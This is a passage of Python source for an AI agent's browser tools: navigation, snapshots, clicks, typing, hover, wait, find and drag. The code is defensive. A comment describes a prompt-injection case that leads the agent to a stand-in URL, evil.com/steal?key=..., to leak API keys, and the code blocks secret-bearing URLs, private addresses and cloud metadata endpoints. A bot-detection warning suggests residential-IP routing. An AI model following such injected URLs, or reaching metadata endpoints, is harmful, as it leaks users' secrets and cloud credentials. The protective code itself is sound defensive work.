            # than silently returning {"success": True, "data": {}}.
            # Some commands (close, record) legitimately return no output.
            if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
                logger.warning("browser '%s' returned empty output (rc=0)", command)
                result = {"success": False, "error": f"Browser command '{command}' returned no output"}
            elif stdout_text:
                try:
                    parsed = json.loads(stdout_text)
                    # Warn if snapshot came back empty (common sign of daemon/CDP issues)
                    if command == "snapshot" and parsed.get("success"):
                        snap_data = parsed.get("data", {})
                        if not snap_data.get("snapshot") and not snap_data.get("refs"):
                            logger.warning("snapshot returned empty content. Possible stale daemon or CDP connection issue. returncode=%s", returncode)
                    result = parsed
                except json.JSONDecodeError:
                    raw = stdout_text[:2000]
                    logger.warning("browser '%s' returned non-JSON output (rc=%s): %s", command, returncode, raw[:500])

                    if command == "screenshot":
                        stderr_text = (stderr or "").strip()
                        combined_text = "\n".join(part for part in [stdout_text, stderr_text] if part)
                        recovered_path = _extract_screenshot_path_from_text(combined_text)

                        if recovered_path and Path(recovered_path).exists():
                            logger.info(
                                "browser 'screenshot' recovered file from non-JSON output: %s",
                                recovered_path,
                            )
                            result = {
                                "success": True,
                                "data": {
                                    "path": recovered_path,
                                    "raw": raw,
                                },
                            }
                        else:
                            result = {"success": False, "error": f"Non-JSON output from agent-browser for '{command}': {raw}"}
                    else:
                        result = {"success": False, "error": f"Non-JSON output from agent-browser for '{command}': {raw}"}
            elif returncode != 0:
                error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
                result = {"success": False, "error": error_msg}
            else:
                result = {"success": True, "data": {}}

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        result = {"success": False, "error": str(e)}

    # --- Lightpanda automatic Chrome fallback ---
    # If engine is lightpanda and the result looks broken, retry with Chrome.
    # This runs for ALL exit paths (timeout, empty, non-JSON, nonzero rc, parsed).
    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
    if fallback_reason:
        logger.info(
            "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
            command,
            task_id,
            fallback_reason,
        )
        # For screenshots, use the dedicated Chrome fallback helper
        # (spins up a separate Chrome session to the same URL).
        if command == "screenshot":
            fallback_result = _chrome_fallback_screenshot(task_id, args or [], timeout)
        else:
            fallback_result = _run_chrome_fallback_command(task_id, command, args, timeout)
        return _annotate_lightpanda_fallback(fallback_result, fallback_reason)

    return result


def browser_navigate(url: str, task_id: str | None = None) -> str:
    """
    Navigate to a URL in the browser.

    Args:
        url: The URL to navigate to
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result (includes stealth features info on first nav)
    """
    # Secret exfiltration protection — block URLs that embed API keys or
    # tokens in query parameters. A prompt injection could trick the agent
    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).

    url_decoded = unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs.",
        })
    url = normalize_url_for_request(url)
    normalized_decoded = unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(normalized_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs.",
        })

    # SSRF protection — block private/internal addresses before navigating.
    # Skipped when the navigation is being routed to a per-task local
    # Chromium sidecar (private-URL auto-spawn) or when the operator has
    # set ``browser.allow_private_urls`` in config.
    effective_task_id = task_id or "default"
    nav_session_key = _navigation_session_key(effective_task_id, url)
    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)

    # Always-blocked floor: cloud metadata / IMDS endpoints are denied
    # regardless of backend, hybrid routing, or allow_private_urls.
    # There's no legitimate agent use case for navigating to
    # 169.254.169.254 / metadata.google.internal / ECS task metadata
    # via a browser, and routing those to a local Chromium sidecar
    # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
    if is_always_blocked_url(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a cloud metadata endpoint",
        })

    if not auto_local_this_nav and not _allow_private_urls() and not is_safe_url(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a private or internal address",
        })

    # Website policy check — block before navigating
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({
            "success": False,
            "error": blocked["message"],
            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
        })

    # Camofox backend — delegate after safety checks pass
    if is_camofox_mode():
        return camofox_navigate(url, task_id)

    if auto_local_this_nav:
        logger.info(
            "browser_navigate: routing %s to local Chromium sidecar (private URL)",
            url,
        )

    # (will create one with features logged if not exists)
    session_info = _get_session_info(nav_session_key)
    is_first_nav = session_info.get("_first_nav", True)

    # Auto-start recording if configured and this is first navigation
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(nav_session_key)

    result = _run_browser_command(nav_session_key, "open", [url], timeout=max(_get_command_timeout(), 60))

    # Remember which session served this nav so snapshot/click/fill/...
    # on the same task_id hit it (critical when hybrid routing has both a
    # cloud session and a local sidecar alive concurrently).
    _last_active_session_key[effective_task_id] = nav_session_key

    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

        # Post-redirect SSRF check — if the browser followed a redirect to a
        # private/internal address, block the result so the model can't read
        # internal content via subsequent browser_snapshot calls.
        # Skipped for local backends (same rationale as the pre-nav check),
        # and for the hybrid local sidecar (we're already on a local browser
        # hitting a private URL by design).
        # Always-blocked floor (cloud metadata / IMDS) is enforced even
        # when auto_local_this_nav is true — see pre-nav check for
        # rationale (#16234).
        if final_url and final_url != url and is_always_blocked_url(final_url):
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a cloud metadata endpoint",
            })

        if not auto_local_this_nav and not _allow_private_urls() and final_url and final_url != url and not is_safe_url(final_url):
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a private/internal address",
            })

        response = {"success": True, "url": final_url, "title": title}
        _copy_fallback_warning(response, result)

        # Detect common "blocked" page patterns from title/url
        blocked_patterns = [
            "access denied",
            "access to this page has been denied",
            "blocked",
            "bot detected",
            "verification required",
            "please verify",
            "are you a robot",
            "captcha",
            "cloudflare",
            "ddos protection",
            "checking your browser",
            "just a moment",
            "attention required",
        ]
        title_lower = title.lower()

        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Switch to the Camofox remote browser backend (set `browser.camofox.url` in "
                "$DESKAGENT_HOME/config.yaml) for residential-IP routing, "
                "4) Some sites have very aggressive bot detection that may be unavoidable."
            )

        # Tell the model which backend is active on the first navigation, so
        # it can correlate bot-detection failures with the backend choice.
        # Supported backends: local Chromium, CDP override, Camofox. No
        # residential proxy / cloud-browser provider is offered.
        if is_first_nav and "features" in session_info:
            active_features = [k for k, v in session_info["features"].items() if v]
            response["stealth_features"] = active_features

        # Auto-take a compact snapshot so the model can act immediately
        # without a separate browser_snapshot call.
        try:
            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                    snapshot_text = _truncate_snapshot(snapshot_text)
                response["snapshot"] = snapshot_text
                response["element_count"] = len(refs) if refs else 0
                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                    _copy_fallback_warning(response, snap_result)
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({"success": False, "error": result.get("error", "Navigation failed")}, ensure_ascii=False)


def browser_snapshot(full: bool = False, task_id: str | None = None, user_task: str | None = None) -> str:
    """
    Get a text-based snapshot of the current page's accessibility tree.

    Args:
        full: If True, return complete snapshot. If False, return compact view.
        task_id: Task identifier for session isolation
        user_task: The user's current task (for task-aware extraction)

    Returns:
        JSON string with page snapshot
    """
    if is_camofox_mode():
        return camofox_snapshot(full, task_id, user_task)

    effective_task_id = _last_session_key(task_id or "default")

    args = []
    if not full:
        args.extend(["-c"])  # Compact mode

    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
            snapshot_text = _extract_relevant_content(snapshot_text, user_task)
        elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
            snapshot_text = _truncate_snapshot(snapshot_text)

        response = {"success": True, "snapshot": snapshot_text, "element_count": len(refs) if refs else 0}
        _copy_fallback_warning(response, result)

        # supervisor is attached to this task. No-op otherwise. See
        # website/docs/developer-guide/browser-supervisor.md.
        try:
            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
            if _supervisor is not None:
                _sv_snap = _supervisor.snapshot()
                if _sv_snap.active:
                    response.update(_sv_snap.to_dict())
        except Exception as _sv_exc:
            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)

        return json.dumps(response, ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", "Failed to get snapshot")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_click(ref: str, task_id: str | None = None) -> str:
    """
    Click on an element.

    Args:
        ref: Element reference (e.g., "@e5")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with click result
    """
    if is_camofox_mode():
        return camofox_click(ref, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    result = _run_browser_command(effective_task_id, "click", [ref])

    if result.get("success"):
        response = {"success": True, "clicked": ref}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", f"Failed to click {ref}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_type(ref: str, text: str, task_id: str | None = None) -> str:
    """
    Type text into an input field.

    Args:
        ref: Element reference (e.g., "@e3")
        text: Text to type
        task_id: Task identifier for session isolation

    Returns:
        JSON string with type result
    """
    if is_camofox_mode():
        return camofox_type(ref, text, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Ensure ref starts with @
    if not ref.startswith("@"):
        ref = f"@{ref}"

    # Use fill command (clears then types)
    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    if result.get("success"):
        response = {"success": True, "typed": text, "element": ref}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", f"Failed to type into {ref}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_scroll(direction: str, task_id: str | None = None) -> str:
    """
    Scroll the page.

    Args:
        direction: "up" or "down"
        task_id: Task identifier for session isolation

    Returns:
        JSON string with scroll result
    """

    if direction not in {"up", "down"}:
        return json.dumps({"success": False, "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."}, ensure_ascii=False)

    # Single scroll with pixel amount instead of 5x subprocess calls.
    # agent-browser supports: agent-browser scroll down 500
    # ~500px is roughly half a viewport of travel.
    _SCROLL_PIXELS = 500

    if is_camofox_mode():
        # Camofox REST API doesn't support pixel args; use repeated calls
        _SCROLL_REPEATS = 5
        result = None
        for _ in range(_SCROLL_REPEATS):
            result = camofox_scroll(direction, task_id)
        return result

    effective_task_id = _last_session_key(task_id or "default")

    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
    if not result.get("success"):
        response = {"success": False, "error": result.get("error", f"Failed to scroll {direction}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {"success": True, "scrolled": direction}
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_back(task_id: str | None = None) -> str:
    """
    Navigate back in browser history.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with navigation result
    """
    if is_camofox_mode():
        return camofox_back(task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "back", [])

    if result.get("success"):
        data = result.get("data", {})
        response = {"success": True, "url": data.get("url", "")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", "Failed to go back")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_press(key: str, task_id: str | None = None) -> str:
    """
    Press a keyboard key.

    Args:
        key: Key to press (e.g., "Enter", "Tab")
        task_id: Task identifier for session isolation

    Returns:
        JSON string with key press result
    """
    if is_camofox_mode():
        return camofox_press(key, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(effective_task_id, "press", [key])

    if result.get("success"):
        response = {"success": True, "pressed": key}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", f"Failed to press {key}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


# Low-cost interaction primitives that retire the common "I have to write JS
# for this" hack via ``browser_console --expression``. ``drag`` and ``select``
# are not implemented here — both have to fight cross-iframe coordinates and
# framework-specific dropdown heuristics; use ``browser_console --expression``
# to dispatch the mouse-event sequences yourself when those are needed.


def _camofox_unsupported(tool_name: str) -> str:
    """Return a graceful-error JSON for tools that Camofox does not support yet."""
    return json.dumps(
        {"success": False, "error": f"{tool_name} is not supported on the Camofox backend in this release."},
        ensure_ascii=False,
    )


def browser_hover(ref: str, task_id: str | None = None) -> str:
    """
    Hover an element (move mouse over it).

    Triggers CSS ``:hover`` rules, dropdown menus, and tooltip previews
    without clicking the element. The ref is taken from
    ``browser_snapshot`` (``@e1``, ``@e2`` …).

    Args:
        ref: Element reference from ``browser_snapshot``, with or without the
            leading ``@`` prefix.
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with the hover result.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_hover")

    effective_task_id = _last_session_key(task_id or "default")
    normalized_ref = ref if ref.startswith("@") else f"@{ref}"
    result = _run_browser_command(effective_task_id, "hover", [normalized_ref])

    if result.get("success"):
        response = {"success": True, "hovered": normalized_ref}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    err = result.get("error", "")
    # Fall through to JS dispatch if agent-browser does not implement hover
    # directly (older versions error with "unknown command"). One synthesized
    # ``mouseover`` event is enough for most CSS :hover rules.
    if any(hint in err.lower() for hint in ("unknown command", "not supported", "no such command")):
        # Fallback: dispatch mouse events directly via JS. The ref lookup
        # reads the ``aria-ref`` attribute that ``agent-browser snapshot``
        # injects into each snapshotted element. If the attribute is absent
        # (element added after the last snapshot), the selector returns null
        # and the hover silently returns false. ``json.dumps`` escapes the
        # ref safely so a malicious snapshot can't break out of the
        # attribute-quoted selector.
        selector = "[aria-ref=" + json.dumps(normalized_ref[1:]) + "]"
        expression = (
            "(function(el){"
            "el.dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));"
            "el.dispatchEvent(new MouseEvent('mouseenter', {bubbles: true}));"
            "return true;"
            "})(document.querySelector(" + selector + ") || null)"
        )
        eval_result = _browser_eval(expression, task_id=effective_task_id)
        try:
            parsed = json.loads(eval_result)
            if parsed.get("success"):
                response = {"success": True, "hovered": normalized_ref, "method": "js"}
                return json.dumps(response, ensure_ascii=False)
        except (json.JSONDecodeError, ValueError):
            pass
        response = {"success": False, "error": f"Failed to hover {normalized_ref}: {err}"}
        return json.dumps(response, ensure_ascii=False)

    response = {"success": False, "error": result.get("error", f"Failed to hover {normalized_ref}")}
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_wait_for(
    selector: str | None = None,
    text: str | None = None,
    timeout_s: float = 10.0,
    return_snapshot: bool = True,
    task_id: str | None = None,
) -> str:
    """
    Wait for a DOM condition (selector or text) to appear or become visible.

    Polls the page every 200ms via ``Runtime.evaluate`` until either the
    selector matches a visible element, the page contains the given text
    (case-insensitive substring match), or the timeout elapses. After a
    successful match the tool returns a compact page snapshot so the model
    can act without a follow-up ``browser_snapshot`` round-trip — pass
    ``return_snapshot=false`` to skip that.

    Args:
        selector: CSS selector to wait for, e.g. ``".checkout-button"``.
        text: Visible text substring to wait for.
        timeout_s: Maximum wait in seconds. Default 10.
        return_snapshot: If True (default), attach a compact snapshot to the
            successful result. If False, only return success without a snapshot.
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with ``matched: bool``, ``elapsed_ms``, optional
        ``snapshot`` (when ``return_snapshot=True``), and on failure the
        reason.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_wait_for")

    if not selector and not text:
        return json.dumps(
            {"success": False, "error": "At least one of `selector` or `text` must be provided."},
            ensure_ascii=False,
        )

    effective_task_id = _last_session_key(task_id or "default")
    deadline = time.monotonic() + max(0.1, timeout_s)
    poll_interval = 0.2
    last_match = None

    # Build the JS probe. It runs synchronously and returns either a match
    # object or null. getBoundingClientRect filters out hidden / zero-size
    # elements that exist in the DOM but are not visible.
    js_selector = ""
    if selector:
        js_selector = (
            "const s = document.querySelector(" + json.dumps(selector) + ");"
            "if (s && s.getBoundingClientRect().width > 0 && s.getBoundingClientRect().height > 0) {"
            "  return {tag: s.tagName, id: s.id || null, text: (s.textContent || '').trim().slice(0, 120)};"
            "}"
        )
    js_text = ""
    if text:
        js_text = (
            "const t = " + json.dumps(text) + ".toLowerCase();"
            "const all = document.querySelectorAll('body *');"
            "for (const el of all) {"
            "  if ((el.textContent || '').toLowerCase().includes(t)"
            "      && el.children.length < 50"
            "      && el.getBoundingClientRect().width > 0) {"
            "    return {tag: el.tagName, id: el.id || null, text: (el.textContent || '').trim().slice(0, 120)};"
            "  }"
            "}"
        )
    expression = "(function(){" + js_selector + js_text + "return null;})()"

    start = time.monotonic()
    while time.monotonic() < deadline:
        eval_result = _browser_eval(expression, task_id=effective_task_id)
        try:
            parsed = json.loads(eval_result)
        except (json.JSONDecodeError, ValueError):
            parsed = {}
        if parsed.get("success") and parsed.get("result") is not None:
            last_match = parsed.get("result")
            break
        # JS exception / supervisor down — the user needs to know rather than
        # silently retrying until timeout.
        if parsed.get("success") is False and parsed.get("error"):
            return json.dumps(
                {
                    "success": False,
                    "error": f"wait_for probe failed: {parsed['error']}",
                    "elapsed_ms": int((time.monotonic() - start) * 1000),
                },
                ensure_ascii=False,
            )
        time.sleep(poll_interval)

    elapsed_ms = int((time.monotonic() - start) * 1000)

    if last_match is None:
        return json.dumps(
            {
                "success": False,
                "matched": False,
                "error": (f"Timed out after {timeout_s:.1f}s waiting for " + (f"selector {selector!r}" if selector else f"text {text!r}")),
                "elapsed_ms": elapsed_ms,
            },
            ensure_ascii=False,
        )

    response = {
        "success": True,
        "matched": True,
        "match": last_match,
        "elapsed_ms": elapsed_ms,
    }
    if return_snapshot:
        snap_json = browser_snapshot(full=False, task_id=task_id)
        try:
            snap_parsed = json.loads(snap_json)
            if snap_parsed.get("snapshot") is not None:
                response["snapshot"] = snap_parsed["snapshot"]
                response["element_count"] = snap_parsed.get("element_count", 0)
        except (json.JSONDecodeError, ValueError, TypeError):
            pass
    return json.dumps(response, ensure_ascii=False)


def browser_find(
    query: str,
    ref_only: bool = True,
    task_id: str | None = None,
) -> str:
    """
    Search the live DOM for elements matching a free-text query.

    Avoids the stale-snapshot trap of looking up text in the most recent
    ``browser_snapshot`` result. The probe runs through the same
    ``Runtime.evaluate`` supervisor as ``browser_console --expression``, so
    it picks up the page's current DOM even after dynamic re-rendering.

    Refs are resolved by reading ``aria-ref`` attributes injected into the DOM
    by ``agent-browser snapshot``. Elements that lack the attribute (e.g.
    inserted by JS after the last snapshot) get ``ref: null`` and are skipped
    when ``ref_only=True``.

    Args:
        query: Substring to match against element text (case-insensitive).
        ref_only: If True (default), only return a list of snapshot ref IDs.
            If False, include each match's tag, text excerpt, and ref.
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with ``matches: [{tag, text, ref}]`` (or just ``[ref]``
        when ``ref_only=True``) and ``count``.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_find")

    if not query or not query.strip():
        return json.dumps(
            {"success": False, "error": "`query` must be a non-empty string."},
            ensure_ascii=False,
        )

    # DOM walk over interactive/focusable elements. Returns at most _FIND_CAP
    # matches with visible bounding rects and matching text. Refs come from
    # the most-recent snapshot — callers that mutate the DOM heavily should
    # follow ``browser_find`` with ``browser_snapshot`` to refresh them.
    effective_task_id = _last_session_key(task_id or "default")
    js = (
        "(function(){const q = " + json.dumps(query.lower()) + ";"
        "const out = [];"
        "const all = document.querySelectorAll('a, button, input, h1, h2, h3, h4, li, td, [role=\"button\"]');"
        f"for (const el of all) {{ if (out.length >= {_FIND_CAP}) break;"
        "  const t = (el.textContent || el.value || '').toLowerCase();"
        "  if (!t || !t.includes(q)) continue;"
        "  const r = el.getBoundingClientRect();"
        "  if (r.width === 0 || r.height === 0) continue;"
        "  out.push({tag: el.tagName.toLowerCase(), text: t.slice(0, 120),"
        "            textOriginal: (el.textContent || el.value || '').trim().slice(0, 120),"
        "            ariaRef: el.getAttribute('aria-ref') || null});"
        "}}"
        "return out;})()"
    )

    eval_result = _browser_eval(js, task_id=effective_task_id)
    try:
        parsed = json.loads(eval_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps(
            {"success": False, "error": "browser_find: failed to parse JS probe result"},
            ensure_ascii=False,
        )

    if not parsed.get("success"):
        return json.dumps(parsed, ensure_ascii=False)

    raw_matches = parsed.get("result") or []
    if not isinstance(raw_matches, list):
        return json.dumps(
            {"success": False, "error": f"browser_find: unexpected probe result type {type(raw_matches).__name__}"},
            ensure_ascii=False,
        )

    matches = []
    for entry in raw_matches:
        if not isinstance(entry, dict):
            continue
        aria_ref = entry.get("ariaRef")
        ref = f"@{aria_ref}" if aria_ref else None
        if ref_only:
            if ref:
                matches.append(ref)
        else:
            matches.append({
                "tag": entry.get("tag"),
                "text": entry.get("textOriginal"),
                "ref": ref,
            })

    return json.dumps(
        {"success": True, "count": len(matches), "matches": matches},
        ensure_ascii=False,
    )


def _cdp_mouse(supervisor, event_type: str, x: float, y: float, button: str = "left", click_count: int = 0) -> dict:
    """Dispatch a CDP Input.dispatchMouseEvent via the supervisor."""
    return supervisor.send_cdp(
        "Input.dispatchMouseEvent",
        {"type": event_type, "x": x, "y": y, "button": button, "clickCount": click_count},
    )


def _cdp_key(supervisor, event_type: str, key: str) -> dict:
    """Dispatch a CDP Input.dispatchKeyEvent via the supervisor."""
    return supervisor.send_cdp("Input.dispatchKeyEvent", {"type": event_type, "key": key})


def browser_drag(
    from_ref: str,
    to_ref: str,
    hold_key: str | None = None,
    task_id: str | None = None,
) -> str:
    """
    Drag an element from one position to another.

    Resolves both snapshot refs (``@e1``, ``@e2`` …) to their on-screen
    bounding rectangles, then dispatches a CDP ``Input.dispatchMouseEvent``
    sequence: ``mousePressed`` at the source center, ``mouseMoved`` in
    10px steps, ``mouseReleased`` at the target center.

    If the browser backend does not support CDP input dispatch (e.g. plain
    agent-browser without a CDP endpoint), falls back to synthesized JS
    ``MouseEvent`` sequences — which are sufficient for most drag-and-drop
    libraries but do not trigger native HTML5 ``dragstart`` / ``dragover``.

    Args:
        from_ref: Source element ref from ``browser_snapshot``.
        to_ref: Target element ref from ``browser_snapshot``.
        hold_key: Optional modifier key held during the drag (``"shift"``,
            ``"ctrl"``, or ``"alt"``).
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with the drag result.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_drag")

    valid_keys = {None, "shift", "ctrl", "alt"}
    if hold_key not in valid_keys:
        return json.dumps(
            {"success": False, "error": f"hold_key must be one of {sorted(k for k in valid_keys if k)}, got {hold_key!r}"},
            ensure_ascii=False,
        )

    effective_task_id = _last_session_key(task_id or "default")
    from_norm = from_ref if from_ref.startswith("@") else f"@{from_ref}"
    to_norm = to_ref if to_ref.startswith("@") else f"@{to_ref}"

    # Step 1: resolve bounding rects via _browser_eval (works with or without
    # a CDP supervisor — the supervisor fast-path is used automatically).
    # ``json.dumps`` ensures the ref is safely attribute-quoted in the
    # selector so a malicious ref can't break out into executable JS.
    from_id = json.dumps(from_norm[1:])
    to_id = json.dumps(to_norm[1:])
    rect_js = (
        "(function(){"
        f"const f=document.querySelector('[aria-ref='+{from_id}+']');"
        f"const t=document.querySelector('[aria-ref='+{to_id}+']');"
        "if(!f||!t)return null;"
        "const fr=f.getBoundingClientRect();"
        "const tr=t.getBoundingClientRect();"
        "if(!fr.width||!fr.height||!tr.width||!tr.height)return null;"
        "return {fx:fr.left+fr.width/2,fy:fr.top+fr.height/2,"
        "tx:tr.left+tr.width/2,ty:tr.top+tr.height/2};"
        "})()"
    )
    rect_result = _browser_eval(rect_js, task_id=effective_task_id)
    try:
        rect_parsed = json.loads(rect_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_drag: failed to resolve element positions"}, ensure_ascii=False)
    if not rect_parsed.get("success") or rect_parsed.get("result") is None:
        return json.dumps(
            {"success": False, "error": f"browser_drag: could not locate one or both elements ({from_norm} → {to_norm}). Run browser_snapshot first to refresh refs."},
            ensure_ascii=False,
        )

    coords = rect_parsed["result"]
    fx, fy = coords["fx"], coords["fy"]
    tx, ty = coords["tx"], coords["ty"]

    # Step 2: dispatch CDP Input events via the supervisor.
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        # No CDP supervisor — fall back to JS synthetic events.
        return _browser_drag_js(from_norm, to_norm, fx, fy, tx, ty, hold_key, task_id)

    steps = max(1, int(math.hypot(tx - fx, ty - fy) / 10))
    try:
        if hold_key:
            _cdp_key(supervisor, "keyDown", hold_key)
        _cdp_mouse(supervisor, "mousePressed", fx, fy, click_count=1)
        for i in range(1, steps + 1):
            mx = fx + (tx - fx) * i / steps
            my = fy + (ty - fy) * i / steps
            _cdp_mouse(supervisor, "mouseMoved", mx, my)
        _cdp_mouse(supervisor, "mouseReleased", tx, ty, click_count=1)
        if hold_key:
            _cdp_key(supervisor, "keyUp", hold_key)
    except Exception as exc:
        return json.dumps({"success": False, "error": f"CDP input dispatch failed: {exc}"}, ensure_ascii=False)

    return json.dumps(
        {"success": True, "from": from_norm, "to": to_norm, "steps": steps, "method": "cdp"},
        ensure_ascii=False,
    )


def _browser_drag_js(
    from_ref: str,
    to_ref: str,
    fx: float,
    fy: float,
    tx: float,
    ty: float,
    hold_key: str | None,
    task_id: str | None,
) -> str:
    """Fallback: synthesize mouse events via JS when no CDP supervisor is available."""
    modifier_js = ""
    if hold_key:
        # ``json.dumps`` produces a JSON string literal; a JSON string is also
        # a valid JS string literal (both delimiters are ``"``), so it can
        # be inlined into the JS source as-is. ``shift`` / ``ctrl`` / ``alt``
        # are ASCII-safe by construction but we use the JSON encoder anyway
        # so arbitrary inputs can't break out of the key string.
        modifier_js = f"window.dispatchEvent(new KeyboardEvent('keydown',{{key:{json.dumps(hold_key)}}}));"

    js = (
        "(function(fx,fy,tx,ty){" + modifier_js + "const m=(t,x,y)=>new MouseEvent(t,{clientX:x,clientY:y,bubbles:true,button:0});"
        # Look up source/target at the actual drop point, not at the start
        # point — `document.elementFromPoint(tx, ty)` returns the live
        # element under the cursor after each mousemove, which is what
        # drag-and-drop libraries expect.
        "const src=document.elementFromPoint(fx,fy);"
        "if(!src)return false;"
        "src.dispatchEvent(m('mousedown',fx,fy));"
        "for(let i=1;i<=5;i++){"
        "  const ix=fx+(tx-fx)*i/5, iy=fy+(ty-fy)*i/5;"
        "  document.dispatchEvent(m('mousemove',ix,iy));"
        "  const tgt=document.elementFromPoint(ix,iy);"
        "  if(tgt){tgt.dispatchEvent(m('mouseover',ix,iy));tgt.dispatchEvent(m('mouseenter',ix,iy));}"
        "}"
        "const dropTgt=document.elementFromPoint(tx,ty);"
        "if(dropTgt)dropTgt.dispatchEvent(m('mouseup',tx,ty));"
        "src.dispatchEvent(m('mouseup',tx,ty));"
        "return true;"
        f"}})({fx},{fy},{tx},{ty})"
    )
    effective_task_id = task_id or "default"
    eval_result = _browser_eval(js, task_id=effective_task_id)
    try:
        parsed = json.loads(eval_result)
        if parsed.get("success") and parsed.get("result"):
            return json.dumps(
                {"success": True, "from": from_ref, "to": to_ref, "steps": 5, "method": "js"},
                ensure_ascii=False,
            )
    except (json.JSONDecodeError, ValueError):
        pass
    return json.dumps(
        {"success": False, "error": f"browser_drag: JS fallback failed for {from_ref} → {to_ref}"},
        ensure_ascii=False,
    )


def browser_select(
    ref: str,
    value: str | None = None,
    label: str | None = None,
    index: int | None = None,
    open_delay_s: float = 0.5,
    task_id: str | None = None,
) -> str:
    """
    Select an option in a ``<select>`` element or a common custom dropdown.

    Resolution order for the option to select (first match wins):
      1. ``value`` — exact match on the ``value`` attribute / option text.
      2. ``label`` — case-insensitive substring match on visible option text.
      3. ``index`` — 0-based position in the option list.

    For native ``<select>`` elements, sets ``select.value`` directly and
    dispatches a ``change`` event. For custom dropdowns built with common
    frameworks (Ant Design ``ant-select``, Element UI ``el-select``,
    Material UI ``MuiSelect``, React Select, etc.), clicks to open, then
    uses keyboard navigation (``ArrowDown`` + ``Enter``) to pick the option.

    Args:
        ref: Element ref from ``browser_snapshot`` (the ``<select>`` or
            the custom dropdown trigger element).
        value: Exact option ``value`` attribute to match.
